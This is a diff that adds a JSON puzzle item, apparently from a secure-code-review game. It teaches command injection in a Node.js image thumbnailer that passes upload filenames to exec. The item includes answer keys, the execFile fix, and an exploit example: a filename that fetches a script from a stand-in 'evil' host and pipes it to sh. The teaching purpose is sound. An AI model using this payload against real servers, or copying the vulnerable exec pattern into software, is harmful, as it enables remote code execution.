@@ -1,0 +1,110 @@
+{
+  "id": "srd-0020",
+  "date": "2026-10-16",
+  "difficulty": "medium",
+  "language": "javascript",
+  "estimatedMinutes": 15,
+  "snippet": {
+    "files": [
+      {
+        "name": "thumbnail.js",
+        "code": "const { exec } = require(\"child_process\");\n\nfunction makeThumbnail(file, cb) {\n  // Resize an uploaded image using ImageMagick.\n  const out = file + \".thumb.png\";\n  const cmd = \"convert \" + file + \" -resize 200x200 \" + out;\n  exec(cmd, cb);\n}\n\nmodule.exports = makeThumbnail;",
+        "notes": {
+          "3": "Called with the path of an uploaded image (the filename is attacker-influenced).",
+          "5": "Derives the output thumbnail path.",
+          "6": "Builds the shell command string with `file` concatenated in.",
+          "7": "`exec` runs that command string through /bin/sh."
+        }
+      }
+    ]
+  },
+  "stages": {
+    "line": {
+      "file": "thumbnail.js",
+      "line": 7,
+      "yellowRadius": 2,
+      "maxGuesses": 5
+    },
+    "bugClass": {
+      "answer": "command-inj",
+      "options": [
+        "command-inj",
+        "code-inj",
+        "path-traversal",
+        "ssrf",
+        "sqli"
+      ]
+    },
+    "why": {
+      "answerIndex": 2,
+      "options": [
+        {
+          "label": "`convert` is CPU-heavy, so repeated calls exhaust the server",
+          "whyWrong": "Resource cost isn't the vulnerability; the shell interpreting the filename is."
+        },
+        {
+          "label": "The thumbnail path is predictable, letting attackers find it",
+          "whyWrong": "Predictable output names are minor next to command execution."
+        },
+        {
+          "label": "`exec` runs the string in a shell and `file` (an attacker-influenced upload name) is concatenated in, so shell metacharacters execute"
+        }
+      ]
+    },
+    "fix": {
+      "answerIndex": 1,
+      "options": [
+        {
+          "label": "Wrap file in single quotes inside the command",
+          "diff": "-  const cmd = \"convert \" + file + \" -resize 200x200 \" + out;\n+  const cmd = \"convert '\" + file + \"' -resize 200x200 '\" + out + \"'\";",
+          "whyWrong": "A single quote in the filename closes the quote and resumes command context."
+        },
+        {
+          "label": "Use execFile('convert', [file, '-resize', '200x200', out]) so no shell parses the arguments",
+          "diff": "-  const { exec } = require(\"child_process\");\n+  const { execFile } = require(\"child_process\");\n-  const cmd = \"convert \" + file + \" -resize 200x200 \" + out;\n-  exec(cmd, cb);\n+  execFile(\"convert\", [file, \"-resize\", \"200x200\", out], cb);"
+        },
+        {
+          "label": "Strip spaces from file",
+          "diff": "+  file = file.replace(/ /g, \"\");",
+          "whyWrong": "Metacharacters like `;`, `|`, `&&`, `$()` and backticks need no spaces."
+        },
+        {
+          "label": "Reject filenames not ending in a known image extension",
+          "diff": "+  if (!/\\.(png|jpg)$/.test(file)) throw new Error(\"bad file\");",
+          "whyWrong": "`x.jpg;id #.png` passes a suffix check and still injects; the shell is still involved."
+        }
+      ]
+    }
+  },
+  "source": {
+    "origin": "original",
+    "license": "CC0-1.0",
+    "attribution": "SourceReadle original"
+  },
+  "training": {
+    "exploit": "Upload a file whose name is `x.jpg; curl http://evil/s | sh #`. When the thumbnailer runs, the shell executes `convert x.jpg ...` and then the injected command. Upload filenames are attacker-controlled, so no other input is needed.",
+    "concepts": [
+      "CWE-78",
+      "OWASP A03:2021"
+    ],
+    "hints": {
+      "line": "Which call hands a built string to a shell?",
+      "bugClass": "The filename reaches the OS shell.",
+      "why": "What parses `file` on line 7 — the program, or /bin/sh?",
+      "fix": "Pass arguments as an array with no shell."
+    }
+  },
+  "writeup": {
+    "summary": "`exec` runs its argument through `/bin/sh`, and `file` — an attacker-influenced upload name — is concatenated into that string, so shell metacharacters in the name execute commands. `execFile('convert', [file, ...])` spawns the binary directly with `file` as one argument; there is no shell to interpret `;`, `|`, `$()`, or backticks. Quoting and suffix checks are bypassable.",
+    "readNext": [
+      {
+        "label": "Node child_process: exec vs execFile",
+        "url": "https://nodejs.org/api/child_process.html"
+      },
+      {
+        "label": "OWASP Command Injection",
+        "url": "https://owasp.org/www-community/attacks/Command_Injection"
+      }
+    ]
+  }
+}
